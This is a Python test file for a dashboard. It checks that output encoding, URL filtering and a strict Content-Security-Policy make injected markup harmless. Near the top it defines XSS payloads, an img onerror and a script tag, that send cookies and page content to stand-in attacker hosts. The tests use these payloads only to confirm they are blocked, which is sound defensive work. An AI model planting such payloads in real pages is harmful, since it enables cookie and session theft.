"""UNFILED-XSS — output-encode + strict CSP against tainted-ledger XSS / SSRF.

The dashboard is a NEW fluid surface: it renders ObserverEvent.detail (tainted) into HTML. This
asserts the encode_field chokepoint renders an injected ``<script>`` / ``<img onerror=…>`` inert,
rejects a ``javascript:`` / off-host URL, and that the strict CSP + nosniff + no-referrer headers
are on every HTML response. The red-team payload is registered in crawfish.testing and exercised
here and by test_redteam_security.
"""

from __future__ import annotations

from crawfish.code.dashboard.encoding import (
    CSP,
    REJECTED_URL,
    SECURITY_HEADERS,
    Encoding,
    encode_field,
    safe_url,
)
from crawfish.code.dashboard.views import render_events, render_page
from crawfish.observe import ObserverEvent, Severity
from crawfish.testing import redteam_attacks, run_redteam

# The concrete SSRF beacon the spec names.
SSRF = "<img src=x onerror=fetch('http://attacker.test/'+document.body.innerHTML)>"
SCRIPT = "<script>fetch('http://evil/'+document.cookie)</script>"


def test_script_payload_is_entity_encoded_inert() -> None:
    out = encode_field(SCRIPT, Encoding.HTML_BODY)
    assert "<script>" not in out
    assert "&lt;script&gt;" in out


def test_ssrf_beacon_renders_inert_in_events_view() -> None:
    ev = ObserverEvent(
        pipeline="triage-bot", kind="quality.flag", detail=SSRF, severity=Severity.WARN
    )
    html = render_events([ev])
    # No live <img> tag survives — the angle brackets are entity-encoded, so the browser
    # parses the whole payload as inert text rather than an element with an onerror handler.
    assert "<img" not in html
    assert "&lt;img" in html  # the payload is present, but entity-encoded (inert)


def test_javascript_url_rejected() -> None:
    assert safe_url("javascript:alert(1)") == REJECTED_URL
    assert encode_field("javascript:alert(1)", Encoding.URL).startswith("about:blank")


def test_offhost_and_protocol_relative_urls_rejected() -> None:
    assert safe_url("http://attacker.test/leak") == REJECTED_URL  # bare http rejected
    assert safe_url("//attacker.test/leak") == REJECTED_URL  # protocol-relative off-host
    assert safe_url("data:text/html,<script>1</script>") == REJECTED_URL


def test_safe_urls_pass() -> None:
    assert safe_url("https://example.com/x") == "https://example.com/x"
    assert safe_url("/runs/r1") == "/runs/r1"  # same-origin relative path


def test_event_data_link_javascript_not_rendered_as_live_link() -> None:
    ev = ObserverEvent(
        pipeline="p", kind="quality.flag", detail="d", data={"link": "javascript:alert(1)"}
    )
    html = render_events([ev])
    assert "javascript:alert(1)" not in html
    assert "about:blank" in html  # the dangerous scheme was rejected to a safe href


def test_strict_csp_and_security_headers_present() -> None:
    header_names = {name for name, _ in SECURITY_HEADERS}
    assert "Content-Security-Policy" in header_names
    assert "X-Content-Type-Options" in header_names
    assert "Referrer-Policy" in header_names
    assert "default-src 'none'" in CSP
    assert "img-src 'self'" in CSP  # blocks off-host <img> beacon
    assert "connect-src 'self'" in CSP  # blocks off-host fetch beacon
    assert "'unsafe-inline'" not in CSP  # no inline script/style allowed


def test_full_page_contains_no_live_injected_markup() -> None:
    from crawfish.code.dashboard.data import CostGauge, FleetSnapshot

    ev = ObserverEvent(pipeline="p", kind="quality.flag", detail=SSRF)
    html = render_page(
        fleet=FleetSnapshot(org_id="local", generated_at=0.0),
        runs=[],
        gauge=CostGauge(org_id="local"),
        events=[ev],
    )
    assert "<img" not in html  # no live tag — the beacon is entity-encoded inert
    assert "<script>fetch" not in html
    # the page's own JS/CSS are same-origin static files, not inline.
    assert 'href="/app.css"' in html


def test_redteam_dashboard_xss_attack_is_blocked() -> None:
    attacks = [a for a in redteam_attacks() if a.surface == "dashboard_xss"]
    assert attacks, "the dashboard_xss red-team payload must be registered (SECURITY.md gate)"
    results = run_redteam(attacks)
    assert all(r.blocked for r in results), [r.how for r in results if not r.blocked]
